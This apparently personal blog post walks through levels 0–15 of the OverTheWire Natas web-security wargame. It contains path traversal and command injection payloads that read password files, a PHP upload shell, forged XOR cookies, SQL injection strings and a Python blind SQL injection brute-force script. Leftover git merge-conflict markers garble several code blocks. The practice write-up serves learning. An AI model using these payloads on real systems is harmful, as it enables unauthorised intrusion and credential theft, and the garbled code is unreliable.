<!DOCTYPE html>
<html><head>
<title>OverTheWire: Natas</title>




<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="description" content="">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">











<script async src="https://www.googletagmanager.com/gtag/js?id=G-GGX6B7CJG5"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-GGX6B7CJG5', { 'anonymize_ip': false });
}
</script>







  




<link rel="icon" href="https://github.com/koolaidxk1d.png">



      <script src="/js/toc.js"></script>
    
    <link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">

<link rel="stylesheet" href="/scss/dark-mode.min.8639175447dba9c4492e41267341943ef380ff56cf71923d2496213542d91fc5.css" integrity="sha256-hjkXVEfbqcRJLkEmc0GUPvOA/1bPcZI9JJYhNULZH8U=" media="screen">


<link rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Material+Icons">



















</head>
<body>
    	<div id="app"><div class="single-column-drawer-container" id="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/links">
                    Cool Links
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/infographics">
                    Infographics
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/about">
                    About Me
                </a>
                
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#level-0" class="nav-level-0">
									Level 0
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-1" class="nav-level-1">
									Level 1
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-2" class="nav-level-2">
									Level 2
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-3" class="nav-level-3">
									Level 3
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-4" class="nav-level-4">
									Level 4
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-5" class="nav-level-5">
									Level 5
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-6" class="nav-level-6">
									Level 6
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-7" class="nav-level-7">
									Level 7
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-8" class="nav-level-8">
									Level 8
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-9" class="nav-level-9">
									Level 9
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-10" class="nav-level-10">
									Level 10
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-11" class="nav-level-11">
									Level 11
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-12" class="nav-level-12">
									Level 12
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-13" class="nav-level-13">
									Level 13
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-14" class="nav-level-14">
									Level 14
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-15" class="nav-level-15">
									Level 15
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-16" class="nav-level-16">
									Level 16
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div id="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a id="navTitle" class="navbar-brand" href="https://koolaidxk1d.github.io/">
            koolaidxk1d
        </a>
        
        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
            <i class="material-icons" id="darkModeToggleIcon2">
                dark_mode
            </i>
        </button>
        
    </div>
</nav>
<div class="single-column-header-container" id="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="https://koolaidxk1d.github.io/">
        <div class="single-column-header-title">koolaidxk1d</div>
        

    </a>
</div>

            <div id="content">
                <div id="streamContainer" class="stream-container">

    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            
                
            

            <div class="post-head-wrapper"
                
                    
                    
                    style="background-image: url('https://koolaidxk1d.github.io/images/natas.jpg')"
                    
                
            >
                <div class="post-title">
                    OverTheWire: Natas
                    
                    <div class="post-meta">
                        
                        <time itemprop="datePublished">
                            2023-06-21 18:16
                        </time>
                        

                        

                        
                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                
                <div class="post-body" v-pre>
                
                    <p>Back for more password hunting! This time we are doing a more web-oriented wargame. Similarly to leviathan, no hints are given on the webpage. This game provides no SSH access; everything is done in the browser.</p>
<p>I&rsquo;m lacking in web-dev knowledge to say the least, so this will be quite challenging.</p>
<hr>
<h2 id="level-0">Level 0</h2>
<p>The password is right in your face the moment you look at the html.</p>
<p><img src="/images/natas0-0.png" alt=""></p>
<hr>
<h2 id="level-1">Level 1</h2>
<p>Same story as level 0, however the workaround is just using the hotkey to open the inspector.
<img src="/images/natas1-0.png" alt=""></p>
<hr>
<h2 id="level-2">Level 2</h2>
<p><img src="/images/natas2-0.png" alt=""></p>
<p>On this level, i can see a png file in the html. I decided to download it. I figured the password might be in the exif data, or perhaps in the raw bytes of the file itself.</p>
<p>No dice&hellip;</p>
<p>Then I thought that maybe I just needed to hash the contents of the file&hellip;.however the previous passwords were 32 char alphanumeric. To my knowledge that doesn&rsquo;t follow the format of any hashing algorithms.</p>
<p>I wracked my brain for way too long before I realized that the file was in the <strong>files/ subdirectory</strong>. I felt like a total idiot when I realized.</p>
<p><img src="/images/natas2-1.png" alt=""></p>
<p>Inside users.txt was the password I sought.</p>
<hr>
<h2 id="level-3">Level 3</h2>
<p>I was stumped on this one for a while, until I thought harder about the comment in the html.</p>
<p><img src="/images/natas3-0.png" alt=""></p>
<p>&ldquo;Not even Google will find it&rdquo;.</p>
<p>When Google indexes your website, you can prevent it from crawling certain directories by specifying them in a file called &ldquo;robots.txt&rdquo;. Because of the very concept of this file, it must be publicly available. We can therefore access it by typing it into the url bar.</p>
<p><img src="/images/natas3-1.png" alt=""></p>
<p>Let&rsquo;s navigate there.</p>
<p><img src="/images/natas3-2.png" alt="">
Once again, the pass is inside the txt.</p>
<hr>
<h2 id="level-4">Level 4</h2>
<p>This level seems to be picky about the place from where I was linked to the website.</p>
<p><img src="/images/natas4-0.png" alt=""></p>
<p>There is an HTTP header included in GET requests that specifies the &ldquo;referrer&rdquo;. I believe we will have to spoof this to appear as though we are coming from natas5. I couldn&rsquo;t find a way to do this natively in the inspector, as the referrer header is greyed out and cannot be edited. I decided to use this firefox extension:</p>
<p><a href="https://addons.mozilla.org/en-US/firefox/addon/referercontrol/">https://addons.mozilla.org/en-US/firefox/addon/referercontrol/</a></p>
<p>Once I spoofed the referrer header I was given the password.</p>
<p><img src="/images/natas4-1.png" alt=""></p>
<hr>
<h2 id="level-5">Level 5</h2>
<p>&ldquo;Access disallowed. You are not logged in.&rdquo;</p>
<p>Well&hellip;we are logged in using the password from the last level, but it seems there is another layer of access control on this level.</p>
<p>My first instinct is to check the cookies.</p>
<p><img src="/images/natas5-0.png" alt=""></p>
<p>I set that to 1 and refreshed. Lo and behold, the password appeared.</p>
<hr>
<h2 id="level-6">Level 6</h2>
<p>A text box labeled &ldquo;Input secret: &quot; and a submit button. The source code is available for this level. Let&rsquo;s take a look.</p>
<p><img src="/images/natas6-0.png" alt=""></p>
<p>If we look at the beginning of the php section, we can see that a file at &ldquo;includes/secret.inc&rdquo; is included in the file, which is likely where the secret is stored.</p>
<p>If we type that after the url we can direct the browser to the file.</p>
<p><img src="/images/natas6-1.png" alt=""></p>
<p>Copy the secret into the form and it returns the password to the next level.</p>
<hr>
<h2 id="level-7">Level 7</h2>
<p>We have two links to different pages on the site. Opening the inspector gives us an interesting hint in the form of an html comment.</p>
<p><img src="/images/natas7-0.png" alt=""></p>
<p>It seems to want us to traverse to /etc/natas_webpass/ (where every user&rsquo;s password resides).</p>
<p>In the url we can see that a url parameter is used called page. It likely refers to the filename of the page we are visiting. It may be possible to use &ldquo;../&rdquo; to go up a directory and get us to the file we want.</p>
<p>We can briefly test this by entering it once as the value. Now we get a warning shown:</p>
<p><img src="/images/natas7-1.png" alt=""></p>
<p>This is actually a good thing, because we can see that it is indeed taking us to different places within the filesystem. Additionally, since this warning is so verbose, we can see where we are. Using this information, we can easily format the url as follows to get to the password:</p>
<p><code>http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8</code></p>
<p><img src="/images/natas7-2.png" alt=""></p>
<hr>
<h2 id="level-8">Level 8</h2>
<p>Once again, a level is asking for a secret input. The source code is provided.</p>
<p>In the source code, we can see the contents of the secret:</p>
<p><img src="levels/natas8-0.png" alt=""></p>
<p>We can see the exact formula used to create the encoded secret. Following the nested operations, we should first convert the hex to its binary representation, then reverse it, and finally base64 decode it. We can do all of this very quickly and easily with <a href="https://gchq.github.io/CyberChef/">CyberChef</a>.</p>
<p><img src="/images/natas8-1.png" alt=""></p>
<p>Entering the output gets us the password to level 9.</p>
<hr>
<h2 id="level-9">Level 9</h2>
<p>A search box allows us to search for a word in an unknown set of data. The site displays the search results under &ldquo;Output:&rdquo;.</p>
<p><img src="/images/natas9-0.png" alt=""></p>
<p>In the source code we can see that the script is using passthru() to run linux commands on the system and direct stdout to the page.</p>
<p><img src="/images/natas9-1.png" alt=""></p>
<p>Any time a user-facing input has direct access to run commands on the system, it should be inspected for possibility of exploitation. In this case, we can easily use some special shell characters to run our own commands.</p>
<p>Take a look at <a href="https://book.hacktricks.xyz/pentesting-web/command-injection#command-injection-execution">command injection overview</a> to see how just a few of these special characters work. I am going to make $key equal to <code>. &lt; /etc/natas_webpass/natas10 #</code>. So the entire command executed will now be <code>grep -i . &lt; /etc/natas_webpass/natas10 # dictionary.txt</code>.
The dot tells grep to print indiscriminately. The (&lt;) tells grep to get the data to search from the file mentioned afterward. The (#) is a character used to comment out the rest of the line; since we cannot remove the &ldquo;dictionary.txt&rdquo; part, we just comment it out.</p>
<p>Inputting our new $key string gives us the contents of the password file.</p>
<hr>
<h2 id="level-10">Level 10</h2>
<p>Looks like we have the same challenge again, except some characters are filtered out of the input.</p>
<p><img src="/images/natas10-0.png" alt=""></p>
<p>Let&rsquo;s check and see which characters are not allowed.</p>
<p><img src="/images/natas10-1.png" alt=""></p>
<p>&ldquo;preg_match()&rdquo; is a function which uses regex. As you can see it is checking for &ldquo;/[;|&amp;]/&rdquo;. In regex terms, it is actually just looking for either a &ldquo;;&rdquo; or a &ldquo;&amp;&rdquo;. I did not use either of those in my solution so I can just reuse the previous solution (changing the filename obviously).</p>
<hr>
<h2 id="level-11">Level 11</h2>
<p>This is where this warbox starts to get challenging for me. The goal of this level seems to be to change the data cookie to the proper value so that the password will be revealed. The problem is that the cookie is XOR encrypted.</p>
<p><img src="/images/natas11-0.png" alt=""></p>
<p>The page first checks if a saved cookie already exists. If it does, make sure that it is authentically encrypted with the XOR key. If it is, then load the values for background color and whether to show the password. If it is inauthentic, it will be rejected and the default &ldquo;showpassword&rdquo; value (&ldquo;no&rdquo;) will be used.</p>
<p>So we obviously need to somehow create a json key-value pair with showpassword set to &ldquo;yes&rdquo; and encrypt it and place it into our cookies. But how can we encrypt without knowing the key?</p>
<p><a href="https://www.101computing.net/xor-encryption-algorithm/">XOR encryption</a> is a larger topic which I will not write about, but to sum up the information relevant to this level I will point out that knowing the ciphertext and plaintext can actually make getting the key extremely simple.</p>
<p>If C is the ciphertext, P is the plaintext, and K is the key, then we can say the following:</p>
<p>C XOR P = K
P XOR K = C
C XOR K = P</p>
<p>Great, so in our case what are the ciphertext and plaintext? Well, the plaintext would be the json encoding of $defaultdata, and the ciphertext would be found in our cookies! The ciphertext is base64 encoded as per the source code, so we first need to decode that.</p>
<<<<<<< HEAD
<pre><code>P: {&quot;showpassword&quot;: &quot;no&quot;, &quot;bgcolor&quot;: &quot;#ffffff&quot;}
C: 0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n6
=======
<pre tabindex="0"><code>P: {&#34;showpassword&#34;: &#34;no&#34;, &#34;bgcolor&#34;: &#34;#ffffff&#34;}
C: 0l;$$98-8=?#9*jvi &#39;ngl*+(!$#9lrnh(.*-(.n6
>>>>>>> 6c0caeb35f548f431e9a89e99e4933d3dbd3a18f
</code></pre><p>To XOR these together I simply stole the source code, set the $key value to our plaintext, and called the xor_encrypt() function on the ciphertext. I ran it using a PHP interpreter and echoed the result.</p>
<p><img src="/images/natas11-1.png" alt=""></p>
<p>The repeating characters are the key. &ldquo;KNHL&rdquo;. Now that we have the XOR key, all we have to do is encode our own cookie and place it in to the browser. I will once again use the source code to do this, but this time placing our key into $key, placing the modified json pair into the argument of xor_encrypt(), and running base64_encode on the result.</p>
<p><img src="/images/natas11-2.png" alt=""></p>
<p>To actually use our new cookie, we just need to replace the data cookie with our new value and refresh the page.</p>
<p><img src="/images/natas11-3.png" alt=""></p>
<hr>
<h2 id="level-12">Level 12</h2>
<p>This level allows a file upload up to 1KB. It specifies that it needs to be a JPEG.</p>
<p>At first glance, the best exploitation would probably be to somehow upload a PHP file instead of a JPEG to allow for remote code execution. First let&rsquo;s just upload a blank php file to see if input validation measures are in place.</p>
<p><img src="/images/natas12-0.jpg" alt="">
<img src="/images/natas12-1.jpg" alt=""></p>
<p>Weird. The upload works, but the extension is changed to jpg. The source code is linked so let&rsquo;s dig in.</p>
<p><img src="/images/natas12-2.jpg" alt=""></p>
<p>The extension is defined by the input tag named &ldquo;filename&rdquo; in the form. We can directly edit the extension since it is declared explicitly in the html. Doing this before uploading the file will allow PHP uploads.</p>
<p>Now that we bypassed the extension, we need to write a PHP script that will read out the password file to the screen. To run linux commands on the server we can use the passthru PHP function.</p>
<p>Here is a simple script that will read the password file to the screen.</p>
<<<<<<< HEAD
<pre><code>&lt;?php
	echo(passthru(&quot;cat /etc/natas_webpass/natas13&quot;));
=======
<pre tabindex="0"><code>&lt;?php
	echo(passthru(&#34;cat /etc/natas_webpass/natas13&#34;));
>>>>>>> 6c0caeb35f548f431e9a89e99e4933d3dbd3a18f
?&gt;
</code></pre><hr>
<h2 id="level-13">Level 13</h2>
<p>This level seems to be the same as 12, but with one key difference: the script checks if the file is a legitimate jpeg.</p>
<p><img src="/images/natas13-0.jpg" alt=""></p>
<p>Looking at the source code and comparing it to level 12&rsquo;s, there is now an added conditional. The result of exif_imagetype() is checked before uploading the file. This means we can reuse the same solution from 12 as long as we can somehow make the function see the file as a jpeg.</p>
<p>When a computer handles a file, the way it handles the file is different based on the filetype. The extension of the file is not the only thing that determines the filetype, and usually it is not even what the computer looks at to determine its compatibility. This is where the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">file signature</a> comes in.</p>
<p>File signatures, also called magic numbers, are arbitrary (probably) agreed upon combinations of hex bytes typically placed at the very beginning of a file that tell the computer what kind of data a file is storing. This is important because if a program treats a file wrong it can result in unpredictable behavior. The file signature for a jpeg file is 0xFF_D8_FF_DB.</p>
<p>If we want to upload our PHP script and bypass the check, all we need to do is modify the file signature after writing the script. This can be done using any hex editor. Just insert the bytes before the existing contents.</p>
<p><img src="/images/natas13-1.jpg" alt=""></p>
<p>Using this file you can bypass check while still uploading a coherent script for the page to run and return the password to level 14.</p>
<hr>
<h2 id="level-14">Level 14</h2>
<p>This page is asking us to login. It is likely that some type of database is involved considering we are inputting a user and password. Looking at the source code we can see it is using MySQL.</p>
<p><code>$query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot; and password=\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\&quot;&quot;;</code></p>
<p>The query gets the username and password from the form. We can actually format our response to include SQL phrases. This is called <a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#LineCommentAttacks">SQL Injection</a>. I will use a comment (#) to ignore the rest of the query. By doing so, I can specify a username without needing to match the password. In other words, I can override the original query to instead print out the details of the user of my choosing. The user I will enter is natas15. The input should then look like this:</p>
<p><code>natas&quot;#</code></p>
<p><img src="/images/natas14-0.jpg" alt=""></p>
<hr>
<h2 id="level-15">Level 15</h2>
<p>This level took me&hellip;<em>a while</em>; I spent so long staring at its source code trying to find a hole that wasn&rsquo;t there. Eventually, I realized that it was staring back at me the whole time. Let me explain.</p>
<p>Level 15 contains a search box asking for a username. When you enter it and submit the form, you have three possible responses: &ldquo;user exists&rdquo;, &ldquo;user does not exist&rdquo;, and &ldquo;error in request&rdquo;. There is an optional &ldquo;debug&rdquo; feature which can be activated by adding an extra input to the form and making a GET request rather than a POST. Below is the source code:</p>
<p><img src="/images/natas15-0.jpg" alt=""></p>
<h5 id="reconnaissance">Reconnaissance:</h5>
<ul>
<li>The table used on the mySQL database is presumably a table containing the columns &ldquo;username&rdquo; and &ldquo;password&rdquo; according to the source code comment.</li>
<li>Checking the user &ldquo;natas16&rdquo; on the form shows us that it is on the table, so we can probably assume the password is in the password column of the table. This means we likely don&rsquo;t need to somehow get the /etc/password file from the server, but rather we can get it solely by interfacing with the mySQL database.</li>
<li>You can only get 3 possible responses from the submission.</li>
<li>If we don&rsquo;t count the error response, we are essentially getting yes or no answers to our questions.</li>
<li>After a quick test input (&rdquo; AND 1=1#), I can see the form is not protected against SQL injection, so that is still on the table.</li>
<li>If we check the length of the password value using SQL function LENGTH(password) we get 32. That is the same length as every other level&rsquo;s password, so it is definitely in the table.</li>
</ul>
<p>With the given information, it&rsquo;s highly probable that I will have to find a way to return the password using SQL injection and interpreting binary responses in a way that tells us the password. The obvious answer here is char-by-char guessing.</p>
<p>Each character of the password is alphanumeric, so each char has 62 possible values. If we multiply this by 32 characters in the password, we get 1,984. In other words, we only need to make 1,984 requests to the database. My testing shows that an average response from the server takes about a third of a second. So we can reasonably get the entire password in just a few minutes. So how do we actually go about guessing the letters? I&rsquo;ve written a python script to do just that.</p>
<<<<<<< HEAD
<pre><code>import requests

url = &quot;http://natas15.natas.labs.overthewire.org&quot;
credentials = (&quot;natas15&quot;, &quot;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&quot;)
form_data = {&quot;username&quot;: &quot;x&quot;}
password=&quot;&quot;

alphanumeric_chars = [
'0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',
'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',
'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
'y', 'z'
=======
<pre tabindex="0"><code>import requests

url = &#34;http://natas15.natas.labs.overthewire.org&#34;
credentials = (&#34;natas15&#34;, &#34;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&#34;)
form_data = {&#34;username&#34;: &#34;x&#34;}
password=&#34;&#34;

alphanumeric_chars = [
&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;,
&#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;,
&#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,
&#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;,
&#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;,
&#39;y&#39;, &#39;z&#39;
>>>>>>> 6c0caeb35f548f431e9a89e99e4933d3dbd3a18f
]

for i in range(1, 33):
  for j in alphanumeric_chars:
<<<<<<< HEAD
    form_data[&quot;username&quot;] = f&quot;natas16\&quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#&quot;
=======
    form_data[&#34;username&#34;] = f&#34;natas16\&#34; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#&#34;
>>>>>>> 6c0caeb35f548f431e9a89e99e4933d3dbd3a18f
    
	# Make the cURL request
	
	response = requests.post(url, auth=credentials, data=form_data)
	
<<<<<<< HEAD
	if &quot;exists&quot; in response.text:
	  password += j

	print(f&quot;Current guess: {i}{j}:&quot;)
	print(&quot;Status code:&quot;, response.status_code)
	print(&quot;Content:&quot;, response.text)
	print(&quot;--------------------&quot;)
	print(f&quot;password: {password}&quot;)
	if &quot;exists&quot; in response.text:
=======
	if &#34;exists&#34; in response.text:
	  password += j

	print(f&#34;Current guess: {i}{j}:&#34;)
	print(&#34;Status code:&#34;, response.status_code)
	print(&#34;Content:&#34;, response.text)
	print(&#34;--------------------&#34;)
	print(f&#34;password: {password}&#34;)
	if &#34;exists&#34; in response.text:
>>>>>>> 6c0caeb35f548f431e9a89e99e4933d3dbd3a18f
      break
</code></pre><p>My concept is a two-dimensional loop. On the outside, iterating over the chars of the string (1-32) and, inside of that, iterating over possible values for those chars(a-z, A-Z, 0-9).</p>
<p>On each iteration, I make a curl request to the site using the credentials and include a variable value for the &ldquo;username&rdquo; input depending on the current iteration. The form data contains SQL injection code in the username field. Then if a char is correct (meaning: the request response contains the word &ldquo;exists&rdquo;) then the char is appended to an undeclared password string variable and we break out of the loop to avoid guessing more chars that we know will be false.</p>
<p>My SQL command given to the &ldquo;username&rdquo; field looks like this:
<code>natas16&quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#</code></p>
<p>I&rsquo;ve input natas16&quot; to avoid an error, and then added the rest which compares the guess to the actual char of the password at the index defined by the current iteration.</p>
<p>When I ran the script I got the password in a few minutes.</p>
<p><img src="/images/natas15-1.gif" alt=""></p>
<hr>
<h2 id="level-16">Level 16</h2>
<p>(coming soon)</p>

                    
                    <HR width="100%" id="EOF">
		    <p style="color:#777;">Last modified on 2023-06-21</p>
                    
                </div>
            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts" href="/posts/infographics/">
			Next<br>Infographics
                </a>
                
                
                
                <a class="older-posts" href="/posts/links/">
			Previous<br>Cool Links
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                










<script src="https://utteranc.es/client.js"
        repo="koolaidxk1d/koolaidxk1d.github.io"
        issue-term="title"
        label="your label"
        theme="preferred-color-scheme"
        crossorigin="anonymous"
        async>
</script>



            </div>
        </div>
    </div>


                    </div>
            </div><div id="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="https://koolaidxk1d.github.io/">
    
        <div class="nav-title">
            koolaidxk1d
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/links">
                Cool Links
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/infographics">
                Infographics
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/about">
                About Me
            </a>
            
        
    </div>

    

    <div class="nav-footer">
        

&copy;
	
	2023 koolaidxk1d
	

    </div>
    
</div><div id="extraContainer" class="extra-container">
    <div class="toc-wrapper">
        

        
        <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#level-0" class="nav-level-0">
									Level 0
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-1" class="nav-level-1">
									Level 1
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-2" class="nav-level-2">
									Level 2
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-3" class="nav-level-3">
									Level 3
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-4" class="nav-level-4">
									Level 4
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-5" class="nav-level-5">
									Level 5
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-6" class="nav-level-6">
									Level 6
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-7" class="nav-level-7">
									Level 7
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-8" class="nav-level-8">
									Level 8
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-9" class="nav-level-9">
									Level 9
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-10" class="nav-level-10">
									Level 10
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-11" class="nav-level-11">
									Level 11
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-12" class="nav-level-12">
									Level 12
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-13" class="nav-level-13">
									Level 13
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-14" class="nav-level-14">
									Level 14
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-15" class="nav-level-15">
									Level 15
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-16" class="nav-level-16">
									Level 16
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
        
    </div>
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top"
            :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
        <a type="button" class="pagination-action" id="darkModeToggleButton">
            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
                dark_mode
            </span>
        </a>
        
        
    </div>
</div><div id="single-column-footer">

&copy;
	
	2023 koolaidxk1d
	
</div>
            </div>
    
    <script src="/js/journal.js"></script></body>
</html>
